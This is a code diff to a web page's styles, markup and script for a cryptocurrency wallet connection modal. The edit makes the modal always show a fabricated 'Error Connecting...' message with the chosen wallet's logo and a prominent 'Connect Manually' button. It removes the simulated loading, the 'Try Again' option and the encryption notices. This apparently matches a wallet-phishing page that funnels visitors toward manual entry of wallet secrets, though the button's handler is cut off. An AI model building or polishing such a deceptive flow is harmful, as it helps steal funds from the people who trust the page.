@@ -877,6 +877,58 @@ body {
     box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3); /* Stronger blue focus shadow */
 }
 
+/* Styles for the new "Error Connecting" message box */
+.error-message-box {
+    background-color: #ffeef5; /* Light pink background */
+    color: #e6007a; /* Dark pink text */
+    padding: 1rem;
+    border-radius: 0.75rem; /* Rounded corners */
+    margin-bottom: 1.5rem; /* Space below the box */
+    font-weight: 600;
+    font-size: 1.1rem;
+    text-align: center;
+    box-shadow: 0 2px 8px rgba(230, 0, 122, 0.1); /* Subtle shadow */
+}
+
+/* Styles for the wallet display box within the error modal */
+.wallet-display-box {
+    background-color: #ffffff; /* White background */
+    padding: 1rem;
+    border-radius: 0.75rem; /* Rounded corners */
+    box-shadow: 0 1px 5px rgba(0, 0, 0, 0.08); /* Subtle shadow */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 1rem; /* Space between logo and text */
+    margin-bottom: 1.5rem; /* Space below the box */
+}
+
+.wallet-display-box .wallet-logo-large {
+    width: 60px; /* Adjust size to match image */
+    height: 60px;
+    object-fit: contain;
+    border-radius: 50%; /* Ensure circular */
+}
+
+.wallet-display-box .wallet-name-large {
+    font-size: 1.2rem; /* Adjust font size */
+    font-weight: 600;
+    color: #1f2937;
+}
+
+/* Style for the "Connect Manually" button in error state */
+.action-button.error-primary {
+    background-color: #e6007a; /* Pink/red color from image */
+    color: #ffffff;
+    box-shadow: 0 4px 12px rgba(230, 0, 122, 0.2);
+}
+
+.action-button.error-primary:hover {
+    background-color: #cc0066; /* Darker pink/red on hover */
+    transform: translateY(-1px);
+    box-shadow: 0 6px 16px rgba(230, 0, 122, 0.3);
+}
+
 
 @media (max-width: 768px) {
   .nav {
@@ -1197,7 +1249,7 @@ body {
                 <a href="#"><img src="https://www.bing.com/th/id/OIP.Y6P1GkxkEoLoIRsS1wMZiwHaFj?w=254&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="YouTube"></a>
                 <a href="#"><img src="https://www.bing.com/th/id/OIP.Cn9SAHCmTy8MEaixr8bqpAHaHa?w=172&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="LinkedIn"></a>
                 <a href="#"><img src="https://www.bing.com/th/id/OIP.SqoeKJPmo667mmrM6IQCxwHaEK?w=263&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Discord"></a>
-                <a href="#"><img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8qUQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter"></a>
+                <a href="#"><img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8UQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter"></a>
                 <a href="#"><img src="https://th.bing.com/th/id/OIP.lYN2s7Dv1a4pLAVUaXMCVgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Telegram"></a>
             </div>
         </div>
@@ -1228,29 +1280,25 @@ body {
     <div id="connectionModal" class="modal-overlay connection-modal-redesign">
         <div class="modal-content">
             <button class="modal-close-button" id="closeConnectionModal">&times;</button>
-            <div class="modal-header">
-                <img id="modalWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-large">
-                <h2 id="modalWalletName" class="wallet-name-large"></h2>
-                <p class="encryption-text">End-to-End Encryption</p>
-            </div>
+            <!-- Removed modal-header and encryption-text -->
             
-            <div id="loadingState">
+            <div id="loadingState" style="display: none;">
                 <div class="modal-loading-spinner"></div>
                 <p class="text-gray-700">Connecting...</p>
             </div>
 
-            <div id="errorState" style="display: none;">
-                <p class="error-message">There's an error while connecting, connect manually.</p>
+            <div id="errorState" style="display: block;"> <!-- Always show error state for this specific design -->
+                <div class="error-message-box">Error Connecting...</div>
+                <div class="wallet-display-box">
+                    <img id="modalWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-large">
+                    <span id="modalWalletName" class="wallet-name-large"></span>
+                </div>
                 <div class="action-buttons">
-                    <!-- Removed Try Again button -->
-                    <button id="connectManuallyBtn" class="action-button primary">Connect Manually</button>
+                    <button id="connectManuallyBtn" class="action-button error-primary">Connect Manually</button>
                 </div>
             </div>
 
-            <!-- Security message for the modal -->
-            <p class="security-warning">
-                This session is protected with an end-to-end encryption.
-            </p>
+            <!-- Removed security-warning -->
         </div>
     </div>
 
@@ -1277,7 +1325,6 @@ body {
             const modalWalletName = document.getElementById('modalWalletName');
             const loadingState = document.getElementById('loadingState');
             const errorState = document.getElementById('errorState');
-            // const tryAgainBtn = document.getElementById('tryAgainBtn'); // Removed this line
             const connectManuallyBtn = document.getElementById('connectManuallyBtn');
 
             // Wallet data (copied from html-file)
@@ -1406,16 +1453,10 @@ body {
                 modalWalletLogo.alt = `${wallet.name} Logo`;
                 modalWalletName.textContent = wallet.name;
 
-                // Reset state to loading
-                loadingState.style.display = 'block';
-                errorState.style.display = 'none';
+                // Always show the error state as per the new design
+                loadingState.style.display = 'none';
+                errorState.style.display = 'block';
                 connectionModal.classList.add('active');
-
-                // Simulate loading
-                setTimeout(() => {
-                    loadingState.style.display = 'none';
-                    errorState.style.display = 'block';
-                }, 4000); // Simulate a 4-second connection attempt
             }
 
             // Function to render wallets in the first modal
@@ -1478,16 +1519,6 @@ body {
                 connectionModal.classList.remove('active');
             });
 
-
-            // Event listener for "Try Again" button in the second modal
-            // Removed this event listener as the button is removed.
-            // tryAgainBtn.addEventListener('click', function() {
-            //     const currentWallet = {
-            //         logo: modalWalletLogo.src,
-            //         name: modalWalletName.textContent
-            //     };
-            //     showConnectionModal(currentWallet);
-            // });
 
             // Event listener for "Connect Manually" button in the second modal
             connectManuallyBtn.addEventListener('click', function() {
